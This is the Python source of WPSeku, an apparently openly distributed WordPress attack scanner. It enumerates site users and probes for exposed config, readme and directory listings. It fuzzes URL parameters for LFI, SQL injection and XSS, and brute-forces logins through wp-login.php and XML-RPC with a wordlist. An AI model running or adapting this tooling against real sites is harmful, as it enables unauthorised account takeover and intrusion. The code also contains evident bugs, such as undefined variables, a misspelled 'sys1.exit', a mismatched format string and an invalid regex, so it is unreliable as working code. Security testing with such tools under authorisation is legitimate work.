#!/usr/bin/env python
# -*- coding:utf-8 -*- 
# WPSeku - Wordpress Security Scanner
# Coded by Momo Outaadi (@M4ll0k) (c) 2017
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, version 3 of the License.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.


import os
import sys
import getopt 
import urlparse 
import re
import datetime
import time 
import urllib2 
import urllib
import json
import requests
import cookielib


class WPColors():
	### simple list colors
	red = lambda n:("\033[1;31m")
	white = lambda n:("\033[1;38m")
	nwhite = lambda n:("\033[0;38m")
	green = lambda n:("\033[1;32m")
	yellow = lambda n:("\033[1;33m")
	blue = lambda n:("\033[1;34m")
	end = lambda n:("\033[0m")

class WPPrinter():
	### print class
	def __init__(self,string):
		self.string = string
	def pprint(self,flag="+"):
		print ("%s]"%WPColors().green()+str(flag)+"[%s %s"%(WPColors().end(),WPColors().nwhite())\
		+str(self.string)+WPColors().end())
	def nprint(self,flag="-"):
		print ("%s]"%WPColors().red()+str(flag)+"[%s %s"%(WPColors().end(),WPColors().nwhite())\
		+str(self.string)+WPColors().end())
	def iprint(self,flag="!"):
		print ("%s]"%WPColors().red()+str(flag)+"[%s %s"%(WPColors().end(),WPColors().nwhite())\
		+str(self.string)+WPColors().end())

class WPEnum():
	### Enumeration users 
	def __init__(self,url,headers):
		self.url = url 
		self.headers = headers
		self.wpj = "/wp-json/wp/v2/users"
		self.wpauth = "/?author="
		self.wpf = "/?feed=rss2"
		self.username = []

	def CheckUrl(self,uri,path):
		if uri.endswith("/"):
			return uri+path[1:]
		else:
			return uri+path

	def wpjson(self):
		try:
			req = urllib2.Request(self.CheckUrl(self.url,self.wpj),None,self.headers)
			html = urllib2.urlopen(req).read()
			if html:
				jsont = json.loads(html,'utf-8')
				for x in range(len(jsont)):
					self.username.append(jsont[x]["name"])
		except Exception,err:
			pass

	def wpauthor(self):
		for x in range(0,20):
			try:
				req = urllib2.Request(self.CheckUrl(self.url,self.wpauth),None,self.headers)
				html = urllib2.urlopen(req).read()
				user = re.findall('author author-(.+?) ',html,re.I)
				self.username.extend(user)
			except Exception,err:
				try:
					req = urllib2.Request(self.CheckUrl(self.url,self.wpauth),None,self.headers)
					html = urllib2.urlopen(req).read()
					user = re.findall('/author/(.+?)/feed/',html,re.I)
					self.username.extend(user)
				except Exception,err:
					pass

	def wpfeed(self):
		try:
			req = urllib2.Request(self.CheckUrl(self.url,self.wpf),None,self.headers)
			html = urllib2.urlopen(req).read()
			user = re.findall("<dc:creator><!\[CDATA\[(.+?)\]\]></dc:creator>",html,re.I)
			if user:
				self.username.extend(user)
		except Exception,err:
			try:
				req = urllib2.Request(self.CheckUrl(self.url,self,wpf),None,self.headers)
				html = urllib2.urlopen(req).read()
				user = re.findall("<dc:creator>(.+?)</dc:creator>",html,re.I)
				if user:
					self.username.extend(user)
			except Exception,err:
				pass 

	def Process(self):
		print ""
		((WPPrinter("Enumeration usernames..."))).pprint()
		self.wpjson()
		self.wpauthor()
		self.wpfeed()
		newuser = []
		for user in self.username:
			if user not in newuser:
				newuser.append(user)
		if newuser:
			for x in range(len(newuser)):
				print "\tID: %s - User: %s"%(x+1,newuser[x])
		else:
			print "\tNot found users"

class WPGeneric():
	### Generic checks 
	def __init__(self,url,headers):
		self.url = url
		self.headers = headers
		self.readme = "/readme.html"
		self.robots = "/robots.txt"
		self.pathdic = "/wp-includes/rss-functions.php"
		self.xmlrpc = "/xmlrpc.php"
		self.sitemap = "/sitemap.xml"
		self.wpconfig = "/wp-config.php"

	def CheckUrl(self,uri,path):
		if uri.endswith("/"):
			return uri+path[1:]
		else:
			return uri+path

	def Version(self):
		### Find run wordpress version
		try:
			url = self.CheckUrl(self.url,self.readme)
			req = urllib2.Request(url,None,self.headers)
			html = urllib2.urlopen(req).read()
			# regular expression
			regex = re.compile('.*wordpress-logo.png" /></a>\n.*<br />.* (\d+\.\d+[\.\d+]*)\n</h1>')
			version = regex.findall(html)
			if version:
				print ""
				((WPPrinter("Wordpress version: %s"%version[0]))).pprint()
		except Exception,err:
			try:
				url = self.CheckUrl(self.url,"")
				req = urllib2.Request(url,None,self.headers)
				html = urllib2.urlopen(req).read()
				version = re.findall('<meta name="generator" content="WordPress (\d+\.\d+[\.\d+]*)"',html,re.I)
				if version:
					print ""
					((WPPrinter("Wordpress version: %s"%version[0]))).pprint()
			except Exception,err:
				pass

	def Readme(self):
		### find readme.html file
		try:
			url = self.CheckUrl(self.url,self.readme)
			req = urllib2.Request(url,None,self.headers)
			html = urllib2.urlopen(req).read()
			if html:
				((WPPrinter("Readme.html available: %s"%url))).pprint()
		except Exception,err:
			pass

	def Robots(self):
		### find robots.txt file 
		try:
			url = self.CheckUrl(self.url,self.robots)
			req = urllib2.Request(url,None,self.headers)
			html = urllib2.urlopen(req).read()
			if html:
				((WPPrinter("Robots.txt available: %s"%url))).pprint()
				print "\r\n%s"%(html)
		except Exception,err:
			pass
	
	def Headers(self):
		### headers
		((WPPrinter("Interesting headers: "))).pprint()
		try:
			req = urllib2.Request(self.CheckUrl(self.url,""),None,self.headers)
			html = urllib2.urlopen(req)
			if html.info().getheader('content-length'):
				print "Content-Length: %s"%(html.info().getheader('content-length'))
			if html.info().getheader('Server'):
				print "\r\nServer: %s"%(html.info().getheader('Server'))
			if html.info().getheader('X-Powered-By'):
				print "X-Powered-By: %s"%(html.info().getheader('X-Powered-By'))
			if html.info().getheader('Link'):
				print "Link: %s"%(html.info().getheader('Link'))
			if html.info().getheader('X-Pingback'):
				print "X-Pingback: %s"%(html.info().getheader('X-Pingback'))
			if html.info().getheader('cf-ray'):
				print "CF-RAY: %s"%(html.info().getheader('cf-ray'))
			if html.info().getheader('set-cookie'):
				print "Set-Cookie: %s"%(html.info().getheader('set-cookie'))
			if html.info().getheader('vary'):
				print "Vary: %s"%(html.info().getheader('vary'))
			if html.info().getheader('content-type'):
				print "Content-Type: %s"%(html.info().getheader('content-type'))
			if html.info().getheader('content-location'):
				print "Content-Location: %s"%(html.info().getheader('content-location'))
			print ""
		except Exception,err:
			pass

	def PathDisc(self):
		### find full path disc.
		try:
			url = self.CheckUrl(self.url,self.pathdic)
			req = urllib2.Request(url,None,self.headers)
			html = urllib2.urlopen(req).read()
			if html:
				if re.search("Fatal error",html,re.I):
					((WPPrinter("Full Path Disclosure: %s"%url))).pprint()
		except Exception,err:
			pass

	def Xmlrpc(self):
		### find xmlrpc
		try:
			url = self.CheckUrl(self.url,self.xmlrpc)
			req = urllib2.Request(url,None,self.headers)
			html = urllib2.urlopen(req).read()
			if html:
				((WPPrinter("XML-RPC Interface available: %s"%url))).pprint()
		except Exception,err:
			pass

	def Sitemap(self):
		### find sitemap
		try:
			url = self.CheckUrl(self.url,self.sitemap)
			req = urllib2.Request(url,None,self.headers)
			html = urllib2.urlopen(req).read()
			if html:
				((WPPrinter("Sitemap available: %s"%url))).pprint()
		except Exception,err:
			pass

	def Wpconfig(self):
		### find wp-config.php file
		try:
			url = self.CheckUrl(self.url,self.wpconfig)
			req = urllib2.Request(url,None,self.headers)
			html = urllib2.urlopen(req).read()
			if html:
				((WPPrinter("Wp-config available: %s"%url))).pprint()
		except Exception,err:
			pass

	def DirList(self):
		### Dir listing 
		path = ["/wp-content/","/wp-includes/","/wp-content/themes/",
		"/wp-content/plugins/","/wp-admin/"]
		for x in path:
			try:
				url = self.CheckUrl(self.url,str(x))
				req = urllib2.Request(url,None,self.headers)
				html = urllib2.urlopen(req).read()
				if html:
					if re.search("Index of",html,re.I):
						((WPPrinter("Dir %s listing enabled: %s"%(str(x),url)))).pprint()
			except Exception,err:
				pass

	def Process(self):
		self.Sitemap()
		self.Robots()
		self.Readme()
		self.PathDisc()
		self.Headers()
		self.DirList()
		self.Xmlrpc()
		self.Wpconfig()
		self.Version()
		((WPTheme(self.url,self.headers))).theme()
		((WPPlugin(self.url,self.headers))).wpplugin()

class WPTheme():
	### find theme
	def __init__(self,url,headers):
		self.url = url 
		self.headers = headers
		self.tpath = "/wp-content/themes/"

	def CheckUrl(self,uri,path):
		if uri.endswith("/"):
			return uri+path[1:]
		else:
			return uri+path 

	def theme(self):
		try:
			req = urllib2.Request(self.url,None,self.headers)
			html = urllib2.urlopen(req).read()
			theme = re.findall(self.tpath+"(.+?)/",html,re.I)
			if theme:
				print ""
				((WPPrinter("Enumeration themes..."))).pprint()
				new = []
				for t in theme:
					if t not in new:
						new.append(t)
				for x in range(len(new)):
					print " | %sName:%s%s %s%s"%(WPColors().red(),WPColors().end(),WPColors().nwhite(),\
						new[x],WPColors().end())
					((self.readme(new[x])))
					((self.style(new[x])))
					((self.license(new[x])))
					((self.fullpath(new[x])))
					((self.dirlisting(new[x])))
					print ""
		except Exception,err:
			pass

	def readme(self,theme):
		path = ['/readme.txt','/README.txt','/readme.md','/README.md']
		for x in range(len(path)):
			try:
				url = str(self.CheckUrl(self.url,self.tpath)+theme+path[x])
				req = urllib2.Request(url,None,self.headers)
				html = urllib2.urlopen(req).read()
				if html:
					print " | %sReadme:%s%s %s%s"%(WPColors().red(),WPColors().end(),WPColors().nwhite(),\
						url,WPColors().end())
			except Exception,err:
				pass

	def style(self,theme):
		path = "/style.css"
		try:
			url = str(self.CheckUrl(self.url,self.tpath)+theme+path)
			req = urllib2.Request(url,None,self.headers)
			html = urllib2.urlopen(req).read()
			if html:
				print " | %sStyle:%s%s %s%s"%(WPColors().red(),WPColors().end(),WPColors().nwhite(),\
					url,WPColors().end())
		except Exception,err:
			pass 

	def license(self,theme):
		path = ['/license.txt','/LICENSE.txt','/license.md','/LICENSE.md']
		for x in range(len(path)):
			try:
				url = str(self.CheckUrl(self.url,self.tpath)+theme+path[x])
				req = urllib2.Request(url,None,self.headers)
				html = urllib2.urlopen(req).read()
				if html:
					print " | %sLicense:%s%s %s%s"%(WPColors().red(),WPColors().end(),WPColors().nwhite(),\
						url,WPColors().end())
			except Exception,err:
				pass 

	def fullpath(self,theme):
		path = ['/functions.php','/404.php','/header.php','/page.php','/footer.php',
		'/sidebar.php','/archive.php','/archives.php','/tag.php','/search.php']
		for x in range(len(path)):
			try:
				url = str(self.CheckUrl(self.url,self.tpath)+theme+path[x])
				req = urllib2.Request(url,None,self.headers)
				html = urllib2.urlopen(req).read()
				if html:
					if re.search('Fatal error',html,re.I):
						print " | %sFull Path Disclosure:%s%s %s%s"%(WPColors().red(),WPColors().end(),WPColors().nwhite(),\
							url,WPColors().end())
			except Exception,err:
				pass

	def dirlisting(self,theme):
		try:
			url = str(self.CheckUrl(self.url,self.tpath)+theme)
			req = urllib2.Request(url,None,self.headers)
			html = urllib2.urlopen(req).read()
			if html:
				if re.search('Index of',html,re.I):
					print " | %sListing:%s%s %s%s"%(WPColors().red(),WPColors().end(),WPColors().nwhite(),url,WPColors().end())
		except Exception,err:
			pass

class WPPlugin():
	### find plugins 
	def __init__(self,url,headers):
		self.url = url
		self.headers = headers
		self.ppath = "/wp-content/plugins/"

	def CheckUrl(self,uri,path):
		if uri.endswith("/"):
			return uri+path[1:]
		else:
			return uri+path

	def wpplugin(self):
		try:
			url = self.CheckUrl(self.url,"")
			req = urllib2.Request(url,None,self.headers)
			html = urllib2.urlopen(req).read()
			plugin = re.findall(self.ppath+"(.+?)/",html,re.I)
			if plugin:
				print ""
				((WPPrinter("Enumeration plugins..."))).pprint()
				new = []
				for x in plugin:
					if x not in new:
						new.append(x)
				for l in range(len(new)):
					print " | %sName:%s%s %s%s"%(WPColors().red(),WPColors().end(),WPColors().nwhite(),\
						new[l],WPColors().end())
					print " | %sLocation:%s%s %s%s"%(WPColors().red(),WPColors().end(),WPColors().nwhite(),\
						self.wploc(new[l]),WPColors().end())
					((self.dirlisting(new[l])))
					((self.wpreadme(new[l])))
					((self.wpchange(new[l])))
					print ""
		except Exception,err:
			pass

	def wploc(self,plugin):
		url = self.CheckUrl(self.url,self.ppath)
		return (url+plugin+"/")

	def dirlisting(self,plugin):
		path = "/wp-content/plugins/"+str(plugin)
		try:
			url = self.CheckUrl(self.url,path)
			req = urllib2.Request(url,None,self.headers)
			html = urllib2.urlopen(req).read()
			if html:
				if re.search('Index of',html,re.I):
					print " | %sListing:%s%s %s%s"%(WPColors().red(),WPColors().end(),WPColors().nwhite(),\
						url,WPColors().end())
		except Exception,err:
			pass

	def wpreadme(self,plugin):
		path = "/readme.html"
		try:
			url = (self.CheckUrl(self.url,self.ppath)+plugin+path)
			req = urllib2.Request(url,None,self.headers)
			html = urllib2.urlopen(req).read()
			if html:
				print " | %sReadme:%s%s %s%s"%(WPColors().red(),WPColors().end(),WPColors().nwhite(),\
					url,WPColors().end())
		except Exception,err:
			pass 

	def wpchange(self,plugin):
		path = "/changelog.txt"
		try:
			url = (self.CheckUrl(self.url,self.ppath)+plugin+path)
			req = urllib2.Request(url,None,self.headers)
			html = urllib2.urlopen(req).read()
			if html:
				print " | %sChangelog:%s%s %s%s"%(WPColors().red(),WPColors().end(),WPColors().nwhite(),\
					url,WPColors().end())
		except Exception,err:
			pass

class WPAttack():
  ### find vulns
  def __init__(self,url,path,query,headers):
    self.url = url 
    self.path = path
    self.query = query
    self.headers = headers
    self.wplfi = os.path.join('db/wp_lfi.txt') 
    self.wpxss = os.path.join('db/wp_xss.txt') 
    self.wpsql = os.path.join('db/wp_sql.txt')

  def CheckUrl(self,url,path,query):
    return (url+path+"?"+query)

  def lfiattack(self):
    file = open(self.wplfi)
    print ""
    ((WPPrinter("Searching lfi vulns..."))).pprint()
    for line in file:
      u = urlparse.urlsplit(self.CheckUrl(self.url,self.path,self.query))
      params = dict([part.split('=') for part in u.query.split('&')])
      for tuple in params.items():
        site = u.scheme+"://"+u.netloc+u.path+"?"+tuple[0]+"="+str(line.strip())
        try:
          req = urllib2.Request(site,None,self.headers)
          html = urllib2.urlopen(req)
          if html:
            find = re.findall("define (\W+\w+\W+\w+\W+\w*)",html.read(),re.I)
            if find == []:
              print "[%s][%sNot Vuln%s]\t%s"%(html.code,WPColors().green(),WPColors().end(),site)
            else:
              print "[%s][Vuln]\t%s"%(html.code,WPColors().red(),WPColors().end(),site)
        except Exception,err:
          pass

  def rcode(self,html):
    if re.search('You have an error in your SQL syntax',html,re.I):
      return "MySQL Injection"
    elif re.search('supplied argument is not a valid MySQL',html,re.I):
      return "MySQL Injection"
    elif re.search('Microsoft][ODBC Microsoft Access Driver',html,re.I):
      return "Access-Based SQL Injection"
    elif re.search('[Microsoft][ODBC SQL Server Driver',html,re.I):
      return "MSSQL-Based Injection"
    elif re.search('Microsoft OLE DB Provider for ODBC Drivers</font> <font size="2" face="Arial">error',\
      html,re.I):
      return "MSSQL-Based Injection"
    elif re.search('Microsoft OLE DB Provider for ODBC Drivers',html,re.I):
      return "MSSQL-Based Injection"
    elif re.search('java.sql.SQLException: Syntax error or access violation',html,re.I):
      return "Java.SQL Injection"
    elif re.search('PostgreSQL query failed: ERROR: parser:',html,re.I):
      return "PostgreSQL Injection"
    elif re.search('XPathException',html,re.I):
      return "XPath Injection"
    elif re.search('supplied argument is not a valid ldap',html,re.I)|\
    re.search('javax.naming.NameNotFoundException',html,re.I):
      return "LDAP Injection"
    elif re.search('DB2 SQL error:',html,re.I):
      return "DB2 Injection"
    elif re.search('Dynamic SQL Error',html,re.I):
      return "Interbase Injection"
    elif re.search('Sybase message:',html,re.I):
      return "Sybase Injection"
    oracle = re.search('ORA-[0-9]',html,re.I)
    if oracle != None:
      return "Oracle Injection"+" "+oracle.group(0)
    return ""

  def sqlattack(self):
    file = open(self.wpsql)
    print ""
    ((WPPrinter("Searching sql vulns..."))).pprint()
    for line in file:
      u = urlparse.urlsplit(self.CheckUrl(self.url,self.path,self.query))
      params = dict([part.split('=') for part in u.query.split('&')])
      for tuple in params.items():
        site = u.scheme+"://"+u.netloc+u.path+"?"+tuple[0]+"="+str(line.strip())        
        try:
          req = urllib2.Request(site,None,self.headers)
          html = urllib2.urlopen(req)
          print "[%s][%s%s%s]\t%s"%(html.code,WPColors().green(),self.rcode(html.read()),WPColors().end(),site)
        except Exception,err:
          try:
            req = urllib2.Request(site,None,self.headers)
            html = urllib2.urlopen(req)
            print "[%s][%sNot Vuln%s]\t%s"%(html.code,WPColors().green(),WPColors().end(),site)
          except Exception,err:
            pass

  def xssattack(self):
    file = open(self.wpxss)
    ((WPPrinter("Searching xss vulns..."))).pprint()
    for line in file:
      u = urlparse.urlsplit(self.CheckUrl(self.url,self.path,self.query))
      params = dict([part.split('=') for part in u.query.split('&')])
      for tuple in params.items():
        site = u.scheme+"://"+u.netloc+u.path+"?"+tuple[0]+"="+str(line.strip())
        try:
          req = urllib2.Request(site,None,self.headers)
          html = urllib2.urlopen(req)
          if re.search("xss",html.read(),re.I) != None:
            print "[%s][Vuln]\t%s"%(html.code,site)
          else:
            print "[%s][Not Vuln]\t%s"%(html.code,site)
        except Exception,err:
          pass

class WPBrute():
	### Bruteforce login
	def __init__(self,url,pwdfile,user,headers):
		self.url = url 
		self.pwdfile = pwdfile 
		self.user = user
		self.headers = headers
		self.xpath = "/xmlrpc.php"
		self.lpath = "/wp-login.php"

	def bxmlrpc(self):
		file = open(self.pwdfile)
		((WPPrinter("Bruteforcing password via xmlrpc.php..."))).pprint()
		for line in file:
			self.headers['Content-Type'] = 'application/xml'
			postdata = ("""
				<?xml version="1.0" encoding="UTF-8"?>
				<methodCall><methodName>wp.getUsersBlogs</methodName><params>
				<param><value><string>"""+self.user+"""</string></value></param>
				<param><value><string>"""+str(line.rstrip())+"""</string></value></param></params></methodCall>""")
			try:
				if self.url.endswith("/"):
					url = self.url+self.xpath[1:]
				else:
					url = self.url+xpath
				try:
					req = urllib2.Request(url,postdata,self.headers)
					html = urllib2.urlopen(req).read()
					if re.search('<name>isAdmin</name><value><boolean>0</boolean>',html,re.I):
						print "Valid Credentials: user: %s - pwd: %s "%(self.user,pwd)
					elif re.search('<name>isAdmin</name><value><boolean>1</boolean>',html,re.I):
						print "Valid Credentials: user: %s pwd: %s"%(self.user,pwd)
				except Exception,err:
					pass
			except Exception,err:
				pass

	def wplogin(self):
		file = open(self.pwdfile)
		((WPPrinter("Bruteforcing password via wp-login.php..."))).pprint()
		for line in file:
			cookieJar = cookielib.CookieJar()
			cookieHandler = urllib2.HTTPCookieProcessor(cookieJar)
			opener = urllib2.build_opener(cookieHandler)
			opener.addheaders = [('User-agent','Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.12) Gecko/20080214 Firefox/2.0.0.12')]
			cookieJar.clear()
			data = "log=%s&pwd=%s&wp-submit=Login"%(self.user,str(line.rstrip()))
			try:
				if self.url.endswith("/"):
					url = self.url+self.lpath[1:]
				else:
					url = self.url+self.lpath
				html = opener.open(url,data).read()
				if re.search('<strong>ERROR</strong>: Invalid username',html,re.I):
					print "Invalid username";sys.exit()
				elif re.search('ERROR.*block.*',html):
					print "Account Lockout Enabled: Your IP address has been temporary blocked.";sys.exit()
				elif re.search('dashboard',html,re.I):
					print "Valid Credential: User: %s - Pwd: %s"%(self.user,pwd)
			except Exception,err:
				pass

class WPSeku(object):
	### main class 
	def __init__(self,argv):
		self.argv = argv
		self.tname = str(os.path.basename(sys.argv[0])) 
		self.headers = {'User-agent':'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.12) Gecko/20080214 Firefox/2.0.0.12'}

	def WPUsage(self):
		self.WPBanner()
		print "Usage: %s --url URL\n"%self.tname
		print "\t-u --url\tSite URL (e.g: http://site.com)"
		print "\t-e --enum\t"
		print "\t [u:\t\tUsernames Enumeration"
		print "\t-p --plugin\t"
		print "\t [x:\t\tSearch Cross Site Scripting vuln"
		print "\t [l:\t\tSearch Local File Inclusion vuln"
		print "\t [s:\t\tSearch SQL Injection vuln"
		print "\t-t --theme\t"
		print "\t [x:\t\tSearch Cross Site Scripting vuln"
		print "\t [l:\t\tSearch Local File Inclusion vuln"
		print "\t [s:\t\tSearch SQL Injection vuln"
		print "\t-b --brute\t"
		print "\t [l:\t\tBruteforce password login"
		print "\t [x:\t\tBruteforce password login via XML-RPC"
		print "\t--user\t\tSet username, try with enum users"
		print "\t--wordlist\tSet wordlist"
		print "\t-h --help\tShow this help and exit"
		print "Examples:"
		print "\t %s -u www.site.com"%self.tname
		print "\t %s -u www.site.com -e [u]"%self.tname
		print "\t %s -u site.com/path/wp-content/plugins/wp/wp.php?id= -p [x,l,s]"%self.tname
		print "\t %s -u site.com --user test --wordlist dict.txt -b [l,x]"%self.tname
		print "";sys.exit(0)

	def WPBanner(self):
		print WPColors().red()+r"                           _             "+WPColors().end()
		print WPColors().red()+r"  __      ___ __  ___  ___| | ___   _    "+WPColors().end()
		print WPColors().red()+r"  \ \ /\ / / '_ \/ __|/ _ \ |/ / | | |   "+WPColors().end()
		print WPColors().red()+r"   \ V  V /| |_) \__ \  __/   <| |_| |   "+WPColors().end()
		print WPColors().red()+r"    \_/\_/ | .__/|___/\___|_|\_\\__,_|   "+WPColors().end()
		print WPColors().red()+r"           |_|                           "+WPColors().end()
		print WPColors().nwhite()+"[--] WPSeku - Wordpress Security Scanner  "+WPColors().end()
		print WPColors().nwhite()+"[--] WPSeku - v0.1.0                      "+WPColors().end()		
		print WPColors().nwhite()+"[--] Momo Outaadi (@M4ll0k)               "+WPColors().end()
		print WPColors().nwhite()+"[--] https://github.com/m4ll0k/WPSeku   \n"+WPColors().end()

	def WPCheckUrl(self,url):
		((self.WPBanner()))
		uri = ((urlparse.urlsplit))(url)
		self.scheme = ((uri.scheme))
		self.netloc = ((uri.netloc))
		self.path = ((uri.path))
		self.query = ((uri.query))
		if self.scheme not in ["http","https",""]:
			((WPPrinter("Scheme %s not supported"%self.scheme))).nprint();sys.exit()
		if self.netloc == "":
			url = str("http://"+self.path)
			try:
				req = ((requests.packages.urllib3.disable_warnings(0)))
				req = ((requests.get(url,verify=False)))
				if url.split("://")[1] == req.url.split("://")[1].endswith("/"):
					self.url = (url)
					((WPPrinter("URL: %s"%self.url))).pprint()
				else:
					self.url = (req.url)
					((WPPrinter("URL: %s"%self.url))).pprint()
			except Exception,err:
				sys.exit(((WPPrinter("Failed to establish connection"))).iprint())
		else:
			url = ((self.scheme+"://"+self.netloc))
			try:
				req = ((requests.packages.urllib3.disable_warnings()))
				req = ((requests.get(url,verify=False)))
				if url.split("://")[1] == req.url.split("://")[1].endswith("/"):
					self.url = (url)
					((WPPrinter("URL: %s"%self.url))).pprint()
				else:
					self.url = (req.url)
					((WPPrinter("URL: %s"%self.url))).pprint()
			except Exception,err:
				sys.exit(((WPPrinter("Failed to establish connection"))).iprint())
		((WPPrinter("Started: %s %s\n"%(datetime.date.today(),time.strftime("%H:%M:%S"))))).pprint()
		self.WPCheckSite(self.url)

	def WPCheckSite(self,url):
		try:
			req = urllib2.Request(url,None,self.headers)
			html = urllib2.urlopen(req).read()
			if re.search("/wp-includes/(.+?)",html,re.I) or re.search("/wp-content/(+.?)",html,re.I)\
			or re.search("/wp-admin/(.+?)", html,re.I):
				pass
			else:
				sys1.exit(((WPPrinter("%s not running Wordpress :("%url))).iprint())
		except Exception,err:
			pass

	def WPSekuMain(self):
		if len(sys.argv) < 2:
			((self.WPUsage()))
		try:
			opts,args = getopt.getopt(self.argv, "u:h:e:p:t:b:",["url=","help=",\
				"enum=","plugin=","theme=","user=","wordlist="])
		except getopt.error,err:
			((self.WPUsage()))
		for opt,arg in opts:
			if opt in ("-u","--url"):
				target = arg
				((self.WPCheckUrl(target)))
				((WPGeneric(self.url,self.headers))).Process()
			elif opt in ("-h","--help"):
				((self.WPUsage()))
			elif opt in ("-e","--enum"):
				enum = arg
				if enum not in ["u"]:
					((WPPrinter("Enumeration require argument, try \"%s -h/--help\""%self.tname))).nprint();sys.exit()
				else: 
					if enum == "u":
						((WPEnum(self.url,self.headers))).Process()
			elif opt in ("-p","--plugin"):
				plugin = arg
				if plugin not in ["x","l","s"]:
					((WPPrinter("Plugin require argument, try \"%s -h/--help\""%self.tname))).nprint();sys.exit()
				else:
					if plugin == "x":
						WPAttack(self.url,self.path,self.query,self.headers).xssattack()
					elif plugin == "l":
						WPAttack(self.url,self.path,self.query,self.headers).lfiattack()
					elif plugin == "s":
						WPAttack(self.url,self.path,self.query,self.headers).sqlattack()
			elif opt in ("-t","--theme"):
				theme = arg 
				if theme not in ["x","l","s"]:
					((WPPrinter("Theme require argument, try \"%s -h/--help\""%self.tname))).nprint();sys.exit()
				else:
					if theme == "x":
						WPAttack(self.url,self.path,self.query,self.headers).xssattack()
					elif theme == "l":
						WPAttack(self.url,self.path,self.query,self.headers).lfiattack()
					elif theme == "s":
						WPAttack(self.url,self.path,self.query,self.headers).sqlattack()
			elif opt in ("--user"):
				self.user = arg
			elif opt in ("--wordlist"):
				self.wordlist = arg
			elif opt in ("-b","--brute"):
				brute = arg
				if brute not in ["l","x"]:
					((WPPrinter("Theme require argument, try \"%s -h/--help\""%self.tname))).nprint();sys.exit()
				else:
					if brute == "x":
						WPBrute(self.url,self.wordlist,self.user,self.headers).bxmlrpc()
					elif brute == "l":
						WPBrute(self.url,self.wordlist,self.user,self.headers).wplogin()

if __name__ == "__main__":
	try:
		main = WPSeku(sys.argv[1:])
		main.WPSekuMain()
	except KeyboardInterrupt,err:
		print "\n%s]![%s %sKilling me...%s"%(WPColors().red(),WPColors().end(),WPColors().red(),WPColors().end())
